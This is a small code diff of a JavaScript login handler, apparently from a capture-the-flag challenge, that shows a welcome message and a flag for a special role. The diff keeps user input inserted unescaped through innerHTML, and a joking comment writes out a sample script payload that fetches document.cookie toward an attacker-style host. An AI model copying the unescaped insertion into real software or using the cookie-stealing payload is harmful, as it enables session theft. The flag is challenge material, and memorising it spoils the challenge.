@@ -19,10 +19,11 @@ form.addEventListener("submit", (e) => {
         output.textContent = "Credenziali errate.";
         return;
     } else {
-        output.innerHTML = `Benvenuto ${user.username}, ora sei: ${user.role}`;
+        // Hope there isn't a user called "</b><script>fetch(document.cookie, Hackerw3bs1t3)</script> <b> you have been hacked" or it's the end
+        output.innerHTML = `Benvenuto <b>${user.username}</b><br>Il tuo ruolo è: <span style="color:red; font-weight: bold;">${user.role}</span></br>`;
     }
 
     if (user.role === "SuPeR aUrA UsEr") {
-        output.innerHTML = `here is the SuPeR aUrA UsEr flag: flag{md5_cr4ck1n9_1s_th3_w4y}`
+        output.innerHTML += `<br>here is the SuPeR aUrA flag: flag{md5_cr4ck1n9_1s_th3_w4y}</br>`
     }
 });
